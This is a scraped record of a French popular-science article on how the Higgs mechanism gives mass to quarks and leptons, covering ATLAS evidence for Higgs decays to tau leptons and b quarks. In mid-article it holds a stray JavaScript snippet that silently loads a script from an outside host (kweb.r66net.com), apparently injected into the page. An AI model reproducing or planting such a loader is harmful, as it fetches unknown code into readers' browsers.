{"title": "Boson de Higgs : l'origine de la masse des quarks se precise", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-24", "content": "Le boson de Brout-Englert-Higgs donne des masses aux particules mediatrices de la force nucleaire faible, mais tres probablement aussi aux quarks et aux leptons. Les preuves de ce phenomene commencent a s'accumuler sous la forme de desintegrations de bosons de Higgs en leptons, et maintenant en quarks. Ce qu'il faut retenir Le boson de Brout-Englert-Higgs (BEH) a d'abord ete utilise pour donner des masses aux bosons W et Z, les quanta d'energie de la force nucleaire faible. Mais le champ du boson BEH peut egalement donner des masses aux quarks et aux leptons (des fermions qui sont les particules de matiere). Le mecanisme donnant des masses a ces fermions fait intervenir ce que l'on appelle << des couplages de Yukawa >> et il se manifeste par l'existence de canaux de desintegration du boson BEH en particules de matiere. On a observe ces canaux avec le tauon et on commence a l'observer avec le quark beau. L'etude de ces canaux pourrait reveler une nouvelle physique. Qu'est-ce que le boson de Higgs ?                       Avant d'etre decouvert, le boson de Higgs a ete postule. Cette particule singuliere, qui n'est ni de la matiere ni le vehicule d'une force, etait une piece manquante des theories existantes. Nathalie Besson, physicienne au CEA, nous explique pourquoi les scientifiques ont introduit cet etrange boson.                                       Il y a quatre ans, les chercheurs et ingenieurs du Cern se preparaient a mettre a niveau le  LHC  pour permettre son redemarrage deux ans plus tard avec des faisceaux de  protons  encore plus lumineux, poursuivant l'objectif de faire, a terme, des collisions a 14 TeV. Futura avait alors explique, dans l'article ci-dessous, que l'on commencait a voir des desintegrations du  boson  de Brout-Englert-Higgs en particules de  matiere . Le modele de Glashow-Salam-Weinberg donne incontestablement des  masses  aux bosons W et Z, les cousins du  photon  pour la force electrofaible. Mais il est susceptible aussi de donner des masses aux  leptons  et aux  quarks  qui viennent de quantites appelees << des couplages de Yukawa >> et dont les caracteristiques exactes doivent pouvoir se tirer d'une theorie plus profonde, au-dela du  modele standard . Verifier l'existence de ces couplages, et, surtout, les mesurer, pourrait donc nous permettre de penetrer dans un nouveau domaine de la  physique . En 2013, on commencait a avoir des preuves de l'existence de ces couplages  via  la desintegration du boson de Higgs en un lepton : le tauon. Mais il fallut attendre de nouvelles donnees, celles fournies depuis 2015 par la deuxieme campagne de recherche avec le LHC, le  run 2 , pour demontrer fermement l'existence de cette desintegration. Une video sur le demarrage de la seconde campagne d'observation avec le LHC en 2015. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres apparaissent alors. Cliquez ensuite sur la roue dentee a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c)  ATLAS Experiment Des bosons qui se desintegrent en leptons mais surtout en quarks b C'est desormais chose faite, mais, comme l'expliquent les membres de la  collaboration Atlas , ce detecteur geant au LHC commence maintenant a voir l'effet d'un autre couplage de Yukawa, celui associe a la masse des quarks beaux (les quarks b), c'est-a-dire des paires de quarks et d'antiquarks b produits par la desintegration du boson de Higgs.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La encore, il va falloir que << la statistique grimpe >>, comme disent les physiciens dans leur jargon, avant d'avoir une preuve qu'au moins un quark possede une masse en raison de l'existence du mecanisme de Brout-Englert-Higgs (BEH). Mais, dernierement, le Cern a annonce avoir battu un  record de luminosite  avec le LHC, donc on ne peut qu'etre optimiste. Bien que la masse des quarks ne rende pas du tout compte de la  masse du proton et du neutron , pas plus que le champ de BEH d'ailleurs, mieux comprendre l'origine de la masse des quarks pourrait avoir des consequences interessantes dans le cadre du debat sur le fameux  principe anthropique . En tout etat de cause, le canal de desintegration du Higgs en quarks beaux est, en lui-meme, interessant parce qu'il est  a priori  celui qui est dominant parmi les canaux de desintegration de ce boson. En fait, il representerait meme 58 % de ces desintegrations, contre 30 % pour les canaux avec photons, bosons W ou Z et tauons. On aurait ainsi assiste a la production d'environ un million de paires de quarks-antiquarks beaux par desintegration du Higgs (H-bb) dans les detecteurs du LHC. Pourquoi ne commence-t-on que maintenant a parler de la detection de ce canal avec, pour le moment, un signal a encore 3.6 sigmas (s) ? Tout simplement parce qu'il y a un fort << bruit de fond >>, comme disent les physiciens. Les collisions de protons produisent beaucoup de quarks et d'antiquarks beaux par d'autres processus. Ainsi, il n'est guere facile d'identifier ceux produits par le boson de Higgs et ceux produits par d'autres reactions. Il va tout de meme falloir attendre un signal a 5 s, donc encore plus de donnees collectees, pour parler d'une vraie decouverte. Il est possible que l'etude fine des couplages de Yukawa avec une decouverte d'une nouvelle physique a la cle ne soit possible qu'avec une autre machine, possedant, elle, un faible bruit de fond hadronique, l' ILC . Mais c'est une autre histoire... Pour en savoir plus L'origine des masses des quarks et leptons precisee Article de  Laurent Sacco  publie le 02/12/2013 Les predictions les plus importantes du modele electrofaible base sur le mecanisme de Brout-Englert-Higgs (BEH) concernent les masses des bosons W et Z. La decouverte du boson de BEH vient d'ailleurs de la detection de sa desintegration en ces particules ainsi qu'en un autre boson, le photon. Grace au detecteur Atlas, au Cern, on s'approche de la preuve que le mecanisme BEH explique aussi les masses des particules de matiere, et pas seulement celles des bosons, ces mediateurs des interactions. Ce serait une confirmation de plus du modele standard. Lorsque  Steven Weinberg  et  Abdus Salam  ont propose en 1967 leur theorie unifiee des forces electromagnetique et nucleaire faible, il leur a fallu utiliser le mecanisme de  Brout-Englert-Higgs  (BEH) pour doter les  bosons W  et Z de masses. Ces bosons sont des cousins du photon, et ils peuvent etre emis ou absorbes par les quarks et les leptons. Il en decoule qu'ils sont responsables de la desintegration  beta  du  neutron  et permettent aux  neutrinos  d'interagir avec l' electron  ou le proton, pour ne citer que ces particules. L'un des peres du mecanisme de Brout-Englert-Higgs, le prix Nobel de physique Francois Englert, a ete photographie alors qu'il visitait l'un des deux detecteurs geants de particules du Cern, Atlas. Ce meme detecteur a fourni des indications serieuses de l'existence d'au moins un mode de desintegration du boson de BEH en deux tauons, des leptons qui ressemblent a l'electron mais beaucoup plus lourds. Comme prevu par le modele standard, le champ de BEH expliquerait les masses des fermions, et pas seulement celles des bosons du modele electrofaible. (c) Claudia Marcelloni, Cern                               Le mecanisme BEH n'explique pas la masse des  nucleons  qui, rappelons-le, ne sont pas des  particules elementaires . On sait que ce qui rend compte de la  masse du proton , par exemple, ce sont les champs de  gluons  de l'interaction nucleaire forte decrite par la  chromodynamique quantique , la QCD. Toutefois, le modele standard, c'est-a-dire la  theorie electrofaible  jointe a la QCD, permet naturellement de generer aussi des masses pour les quarks composant les nucleons via le mecanisme BEH. Il en est de meme pour les masses des leptons comme le  muon  ou le tauon. Ce diagramme de Feynman decrit l'une des nombreuses reactions predites par le modele standard des particules elementaires. Deux quarks dans une collision de protons emettent deux bosons W ou Z qui fusionnent en se transformant en boson de Brout-Englert-Higgs (H 0 ). Ce boson se desintegre ensuite en une paire de tauon-antitauon (t). (c) DP                               Couplages de Yukawa et masses des quarks et leptons La generation des masses des quarks et des leptons se fait au moyen de ce que l'on appelle des  couplages de Yukawa . Ces couplages interviennent entre un champ scalaire, le champ de BEH, et un champ de  fermions  similaire a ceux dont les quarks et les leptons sont des quanta d'excitation. Le premier physicien ayant considere ces couplages fut  Hideki Yukawa  lorsqu'il a propose sa theorie des forces nucleaires fortes entre les protons et les neutrons. Il y avait la aussi un champ scalaire, celui du  meson  pi, couple aux champs de nucleons dans un noyau. Lors de la decouverte du boson de Brout-Englert-Higgs avec les detecteurs  Atlas et CMS , ce sont les modes de desintegration de cette particule en boson W, Z et surtout en photons qui ont ete mesures de facon suffisamment precise pour emporter la conviction des physiciens. A strictement parler, on avait donc une preuve de l'existence du mecanisme de BEH uniquement en ce qui concerne le coeur de la theorie electrofaible. La question de savoir d'ou provenaient les masses des  quarks  et des leptons restait en suspens. Cette image issue des donnees d'Atlas correspond a la production de deux leptons tau, un tauon et son antiparticule, par la desintegration d'un boson de Brout-Englert-Higgs. L'un des tauons s'est ensuite desintegre en un electron (ligne bleue) et un muon (ligne rouge). Ce sont surtout les modes de desintegration du boson BEH en deux photons ou deux bosons W ou Z qui avaient ete observes jusqu'ici. La detection d'indices convaincants de modes de detection fermioniques est une premiere. (c) Cern                               Une desintegration en tauons a 4,1 sigmas Les scientifiques savaient bien sur que les couplages de Yukawa devaient permettre au boson de BEH de se desintegrer en donnant des quarks et des leptons, donc des fermions et pas seulement des bosons. Ils avaient meme des indications de l'occurrence de ces modes de desintegration, mais pas encore de preuve  solide . On y est presque, au moins en ce qui concerne la desintegration du boson de BEH en deux tauons, des cousins lourds de l'electron, si l'on en croit une annonce faite recemment par les membres de la collaboration  Atlas . Les physiciens ont mesure un signal correspondant a ce mode de desintegration avec une signification de 4,1 sigmas, comme ils le disent dans leur jargon. Cela signifie en gros que les chances que ce signal soit une simple fluctuation statistique sont inferieures a 0,007 %. Ce n'est pas encore une decouverte, car il faudrait au moins 5 sigmas, c'est-a-dire 0,00006 % de chance que les mesures soient un effet du hasard. Pour aller plus loin, il faudra attendre le redemarrage du  LHC  en 2015. On espere surtout que les modes de desintegration du Higgs permettront d'avoir acces a de la nouvelle physique, comme la  supersymetrie . Mais peut-etre faudra-t-il attendre la mise en service de l' ILC  pour cela. ", "theme": "sciences"}